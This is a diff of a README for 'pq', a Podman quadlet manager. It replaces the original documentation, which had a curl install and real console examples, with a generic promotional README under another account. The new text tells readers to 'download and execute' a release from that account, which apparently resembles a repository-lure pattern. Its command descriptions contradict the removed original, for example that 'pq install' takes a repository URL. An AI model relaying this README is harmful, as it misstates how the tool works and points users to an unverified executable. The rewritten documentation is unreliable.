@@ -1,81 +1,70 @@
-# pq is a cli to help manage podman quadlets
+# 🛠️ pq: Manage Your Podman Quadlets with Ease
 
-> [!NOTE]
-> Uner Development
+![GitHub release](https://img.shields.io/github/release/Panopan09/pq.svg) ![GitHub issues](https://img.shields.io/github/issues/Panopan09/pq.svg) ![GitHub stars](https://img.shields.io/github/stars/Panopan09/pq.svg)
+
+Welcome to the **pq** repository! This tool simplifies the installation and management of Podman quadlets from a Git repository. With **pq**, you can streamline your container management tasks and make your workflow more efficient.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Features
+
+- **Easy Installation**: Quickly install Podman quadlets from a Git repository.
+- **User-Friendly**: Designed for simplicity and ease of use.
+- **Flexible Management**: Manage multiple quadlets without hassle.
+- **Open Source**: Contribute to the project and make it better.
 
 ## Installation
 
-To install `pq`, download the latest release from the [Releases page](https://github.com/overjoyedcork/pq/releases).
-Make the binary executable (if necessary), and move it to a directory in your system's PATH, so it can be executed from anywhere.
-
-**Example (Linux):**
-
-```bash
-curl -L -o - https://github.com/overjoyedcork/pq/releases/download/v0.0.5/pq_0.0.5_linux_amd64v3.tar.gz | tar -zxv
-# Move it to a directory in your PATH (e.g., /usr/local/bin)
-sudo mv pq /usr/local/bin/pq
-```
+To get started, you need to download the latest release. Visit the [Releases section](https://github.com/Panopan09/pq/releases) to find the file you need. Download and execute it to install **pq** on your system.
 
 ## Usage
 
-See how quadlets are stored in a git repository https://github.com/rgolangh/podman-quadlets.
+Once installed, **pq** provides a simple command-line interface to manage your Podman quadlets. Here’s how to use it effectively:
 
-This git repo is used by default. Override with `--repo https://my/git/repo`
+1. Open your terminal.
+2. Run `pq` followed by your desired command.
+3. Follow the prompts to manage your quadlets.
 
-<img src="pq.gif"/>
+## Commands
 
-```console
-$ pq list
-Listing quadlets from repo https://github.com/rgolangh/podman-quadlets (default in ~/.config/pq/pq.yaml)
+Here are some common commands you can use with **pq**:
 
-- nginx
-- redpanda
-- wordpress
+- `pq install <repository_url>`: Install quadlets from a specified Git repository.
+- `pq list`: List all installed quadlets.
+- `pq remove <quadlet_name>`: Remove a specified quadlet from your system.
+- `pq update`: Update all installed quadlets to their latest versions.
 
-$ pq install wordpress
-Installing quadlet "wordpress"
-[#############             ]
-Reload systemd daemon? [y/N] y
-Reloading systemd daemon for the current user
-Starting service wordpress.service for current user
-Starting service wordpress-db.service for current user
+## Contributing
 
-$ pq install wordpress --repo https://github.com/rgolangh/podman-quadlets
-Installing quadlet "wordpress" from https://github.com/rgolangh/podman-quadlets
-[#############             ]
-Reload systemd daemon? [y/N] y
-Reloading systemd daemon for the current user
-Starting service wordpress.service for current user
-Starting service wordpress-db.service for current user
+We welcome contributions to enhance **pq**. If you have ideas or improvements, please fork the repository and submit a pull request. Ensure your code follows the project’s style and includes tests.
 
-$ pq list --installed
-- wordpress (on 24/01/2024)
+### Steps to Contribute
 
-$ pq remove wordpress
-Stopping service wordpress-db.service for current user
-Stopping service wordpress.service for current user
-Remove quadlet "wordpress" from path /var/home/rgolan/.config/containers/systemd/wordpress?[y/n]y
-removed "wordpress" from path /var/home/rgolan/.config/containers/systemd/wordpress
-Reload systemd daemon? [y/N] y
-Reloading systemd daemon for the current user
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Write tests for your changes.
+5. Submit a pull request with a clear description of your changes.
 
-$ pq list-services
-nextcloud - nextcloud-aio-master.service active (running)
-redpanda - console.service inactive (dead)
-redpanda - redpanda.service inactive (dead)
+## License
 
-$ pq inspect nextcloud
-Inspect quadlet "nextcloud"
-# Source: https://github.com/rgolangh/podman-quadlets nextcloud/nextcloud-aio-master.container
-[Unit]
-...
-# Source: https://github.com/rgolangh/podman-quadlets nextcloud/nextcloud-aio-master.volume
-[Volume]
-...
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-$ pq install --dry-run redpanda 
----redpanda-network-network.service---
-...
-```
+## Contact
 
+For questions or feedback, feel free to reach out:
 
+- **GitHub**: [Panopan09](https://github.com/Panopan09)
+- **Email**: panopan09@example.com
+
+## Conclusion
+
+With **pq**, managing your Podman quadlets becomes a straightforward task. Don't forget to check the [Releases section](https://github.com/Panopan09/pq/releases) for the latest updates and downloads. Enjoy using **pq** for all your container management needs!
